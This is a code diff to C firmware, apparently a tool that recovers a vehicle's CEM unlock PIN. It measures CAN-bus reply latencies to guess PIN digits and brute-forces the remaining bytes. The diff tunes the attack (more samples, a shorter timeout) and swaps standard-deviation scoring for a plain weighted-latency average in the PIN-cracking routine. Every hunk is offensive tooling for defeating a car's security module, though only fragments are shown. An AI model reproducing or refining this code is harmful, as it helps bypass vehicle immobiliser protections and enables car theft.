@@ -101,7 +101,7 @@ uint8_t platform = PLATFORM_UNKNOWN;
 volatile uint8_t operatingState = STATE_IDLE;
 
 #define HAS_CAN_LS          /* in the vehicle both low-speed and high-speed CAN-buses need to go into programming mode */
-#define SAMPLES        25   /* number of samples per sequence, more is better (up to 100) (10 samples = ~3 minutes)*/
+#define SAMPLES        35   /* number of samples per sequence, more is better (up to 100) (10 samples = ~3 minutes)*/
 #define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
 #define NUM_LOOPS      2000 /* how many loops to do when calculating crack rate */
 
@@ -161,11 +161,6 @@ uint8_t CONFIG_P2_data[0xFF];
 uint8_t CONFIG_P2_len;
 uint8_t CONFIG_P3_data[0xFF];
 uint8_t CONFIG_P3_len;
-
-
-uint32_t cem_reply_min;
-uint32_t cem_reply_avg;
-uint32_t cem_reply_max;
 
 /* hardware defintions */
 
@@ -247,12 +242,13 @@ IntervalTimer buttonTimer;
 uint8_t  pin[PIN_LEN];
 uint8_t  pinUsed[PIN_LEN];
 
+uint32_t averageReponse = 0;
+
 /* measured latencies are stored for each of possible value of a single PIN digit */
 
 typedef struct seq {
   uint8_t  pinValue;    /* value used for the PIN digit */
   uint32_t latency;     /* measured latency */
-  double std;           /* standard deviation */
   uint32_t sum;
 } sequence_t;
 
@@ -524,23 +520,6 @@ uint8_t bcdToBin (uint8_t value)
   return ((value >> 4) * 10) + (value & 0xf);
 }
 
-
-
-/*******************************************************************************
-
-   seq_max_std - helper function for qaort std deviation
-
-   Returns: number of PINs processed per second
-*/
-
-int seq_max_std(const void *a, const void *b)
-{
-  sequence_t *_a = (sequence_t *)a;
-  sequence_t *_b = (sequence_t *)b;
-
-  return (int)(100 * _b->std) - (int)(100 *_a->std);
-}
-
 /*******************************************************************************
 
    profileCemResponse - profile the CEM's response to PIN requests
@@ -559,7 +538,7 @@ uint32_t profileCemResponse (int8_t which_byte)
 
   printf("Profiling position %d...\n", which_byte);
 
-  cem_reply_avg = 0;
+  averageReponse = 0;
 
   /* start time in milliseconds */
 
@@ -589,7 +568,7 @@ uint32_t profileCemResponse (int8_t which_byte)
 
     /* keep a running total of the average latency */
 
-    cem_reply_avg += latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);
+    averageReponse += latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);
   }
 
   /* end time in milliseconds */
@@ -598,16 +577,13 @@ uint32_t profileCemResponse (int8_t which_byte)
 
   /* calculate the average latency for a single response */
 
-  cem_reply_avg = cem_reply_avg / NUM_LOOPS;
-
-  cem_reply_min = cem_reply_avg / 2;
-  cem_reply_max = cem_reply_avg + cem_reply_min;
+  averageReponse = averageReponse / NUM_LOOPS;
 
   /* number of PINs processed per second */
 
   rate = 1000 * NUM_LOOPS / (end - start);
 
-  printf ("%u pins in %u ms, %u pins/s, average response: %uus\n", NUM_LOOPS, (end - start), rate, cem_reply_avg);
+  printf ("%u pins in %u ms, %u pins/s, average response: %uus\n", NUM_LOOPS, (end - start), rate, averageReponse);
 
 /*
 #if DEBUG_LATENCY==1
@@ -1059,7 +1035,7 @@ void identifyPlatform (void)
 
     BUCKETS_PER_US        = 1;                    /* how many buckets per microsecond do we store (1 means 1us resolution */
     CEM_REPLY_US          = 100 * BUCKETS_PER_US; /* minimum time in us for CEM to reply for PIN unlock command (approx) */
-    CEM_REPLY_TIMEOUT_MS  = 4;                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
+    CEM_REPLY_TIMEOUT_MS  = 2;                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
     HISTOGRAM_DISPLAY_MIN = 10 * BUCKETS_PER_US;   /* minimum count for histogram display below average */
     HISTOGRAM_DISPLAY_MAX = 10 * BUCKETS_PER_US;   /* maximum count for histogram display above average */
 
@@ -1074,7 +1050,7 @@ void identifyPlatform (void)
 
     BUCKETS_PER_US        = 1;                    /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
     CEM_REPLY_US          = (100 * BUCKETS_PER_US); /* minimum time in us for CEM to reply for PIN unlock command (approx) */
-    CEM_REPLY_TIMEOUT_MS  = 4;                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
+    CEM_REPLY_TIMEOUT_MS  = 2;                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
     HISTOGRAM_DISPLAY_MIN =  7 * BUCKETS_PER_US;//8;                    /* minimum count for histogram display (8us below average) */
     HISTOGRAM_DISPLAY_MAX = 20 * BUCKETS_PER_US;//24;                   /* maximum count for histogram display (24us above average) */
 
@@ -1423,13 +1399,10 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
   uint32_t latency;
   uint32_t prod;
   uint32_t sum;
-  double std;
   uint8_t  pin1;
   uint8_t  pin2;
   uint32_t i;
   uint32_t k;
-  uint32_t xmin = cem_reply_avg - HISTOGRAM_DISPLAY_MIN; // + AVERAGE_DELTA_MIN;
-  uint32_t xmax = cem_reply_avg + HISTOGRAM_DISPLAY_MAX; //AVERAGE_DELTA_MAX;
 
   /* we process three digits in this code */
 
@@ -1442,8 +1415,8 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
   /* print the latency histogram titles */
   printf("           Delay (us): ");
   for (k = 0; k < CEM_REPLY_US; k++) {
-    if ((k >= cem_reply_avg - HISTOGRAM_DISPLAY_MIN) &&
-        (k <= cem_reply_avg + HISTOGRAM_DISPLAY_MAX)) {
+    if ((k >= averageReponse - HISTOGRAM_DISPLAY_MIN) &&
+        (k <= averageReponse + HISTOGRAM_DISPLAY_MAX)) {
       printf ("%3u ", k);
     }
   }
@@ -1534,12 +1507,11 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
     sum  = 0;
 
 
-
     /* dump buckets for debug purposes */
 
     if (DUMP_BUCKETS && platform == PLATFORM_P1)
     {
-      printf ("Average latency: %u\n", cem_reply_avg);
+      printf ("Average latency: %u\n", averageReponse);
 
       for (k = 0; k < CEM_REPLY_US; k++) {
         if (histogram[k] != 0) {
@@ -1554,8 +1526,8 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
         /* print the latency histogram for relevant values */
 
-        if ((k >= cem_reply_avg - HISTOGRAM_DISPLAY_MIN) &&
-            (k <= cem_reply_avg + HISTOGRAM_DISPLAY_MAX)) {
+        if ((k >= averageReponse - HISTOGRAM_DISPLAY_MIN) &&
+            (k <= averageReponse + HISTOGRAM_DISPLAY_MAX)) {
           printf ("%03u ", histogram[k]);
         }
       }
@@ -1563,8 +1535,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     /* loop over the histogram values */
 
-    for (k = 0 ; k < CEM_REPLY_US; k++) 
-    {
+    for (k = 0 ; k < CEM_REPLY_US; k++) {
 
 
       /* verify limit in case parameters are wrong */
@@ -1575,8 +1546,8 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
       /* print the latency histogram for relevant values */
 
-      if ((k >= (cem_reply_avg - HISTOGRAM_DISPLAY_MIN)) &&
-          (k <= (cem_reply_avg + HISTOGRAM_DISPLAY_MAX))) {
+      if ((k >= (averageReponse - HISTOGRAM_DISPLAY_MIN)) &&
+          (k <= (averageReponse + HISTOGRAM_DISPLAY_MAX))) {
         printf ("%03u ", histogram[k]);
         //prod += histogram[k] * k;
         //sum  += histogram[k];
@@ -1584,61 +1555,38 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
       /* calculate weighted count and total of all entries */
 
-
+      //if(histogram[k]>30) /* ignore noise */
+      {
         prod += histogram[k] * k;
         sum  += histogram[k];
-
+      }
     }
 
+    //progModeSend();
 
-    int mean = sum / (xmax - xmin);
-    long x = 0;
-
-    for (unsigned int k = cem_reply_min; k < cem_reply_max; k++) 
-    {
-      int l = k - cem_reply_min;
-      x += sq(histogram[l] - mean);
-    }
-    std = sqrt((double)x / (xmax - xmin));
-
-    /* weighted average */
-
-    printf ("|  lat. % 7u, std %3.2f\n", prod, std);
+    printf (": %u\n", prod);
 
     /* store the weighted average count for this PIN value */
 
     sequence[pin1].pinValue = pin[pos];
     sequence[pin1].latency  = prod;
     sequence[pin1].sum  = sum;
-    sequence[pin1].std  = std;
-
-
-
-
   }
 
   /* sort the collected sequence of latencies */
 
   qsort (sequence, 100, sizeof(sequence_t), seq_max);
 
-  /* print the top 10 and last 5 latencies and their PIN value */
+  /* print the top 25 latencies and their PIN value */
 
-  for (uint32_t i = 0; i < 10; i++) {
-    printf ("% 2u: %02x = %u\n", i, sequence[i].pinValue, sequence[i].latency);
+  for (uint32_t i = 0; i < 25; i++) {
+    printf ("%u: %02x = %u\n", i, sequence[i].pinValue, sequence[i].latency);
   }
-  printf("...\n");
-  for (uint32_t i = 95; i < 100; i++) {
-    printf ("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
-  }
-  double lat_k_0_1   = 100.0 * (sequence[0].latency - sequence[1].latency) / sequence[1].latency;
-  double lat_k_98_99 = 100.0 * (sequence[98].latency - sequence[99].latency) / sequence[99].latency;
-  double lat_k_0_99  = 100.0 * (sequence[0].latency - sequence[99].latency) / sequence[99].latency;
+
 
   /* choose the PIN value that has the highest latency */
 
   printf ("pin[%u] candidate: %02x with latency %u\n", pos, sequence[0].pinValue, sequence[0].latency);
-
-
 
   /* print a warning message if the top two are close, we might be wrong */
 
@@ -1655,30 +1603,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
   pin[pos + 1] = 0;
 
 
-  qsort (sequence, 100, sizeof(sequence_t), seq_max_std);
-
-
-/* print the top 10 and last 5 std deviations and their PIN value */
-
-  printf("\nbest candidates ordered by std:\n");
-  for (uint32_t i = 0; i < 10; i++) {
-    printf ("% 2u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
-  }
-  printf("...\n");
-  for (uint32_t i = 95; i < 100; i++) {
-    printf ("%u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
-  }
-  double std_k_0_1   = 100.0 * (sequence[0].std - sequence[1].std) / sequence[1].std;
-  double std_k_98_99 = 100.0 * (sequence[98].std - sequence[99].std) / sequence[99].std;
-  double std_k_0_99  = 100.0 * (sequence[0].std - sequence[99].std) / sequence[99].std;
-  printf ("pin[%u] candidate: %02x with standard deviation %u\n", pos, sequence[0].pinValue, sequence[0].std);
-
-  printf("\nlat_k 0-1 %3.2f%%, lat_k 98-99 %3.2f%%, lat_k 0-99 %3.2f%%\n", lat_k_0_1, lat_k_98_99, lat_k_0_99);
-  printf("std_k 0-1 %3.2f%%, std_k 98-99 %3.2f%%, std_k 0-99 %3.2f%%\n", std_k_0_1, std_k_98_99, std_k_0_99);
-
-
-
-  printf("Average response: %d\n", cem_reply_avg);
+  printf("Average response: %d\n", averageReponse);
 }
 
 /*******************************************************************************
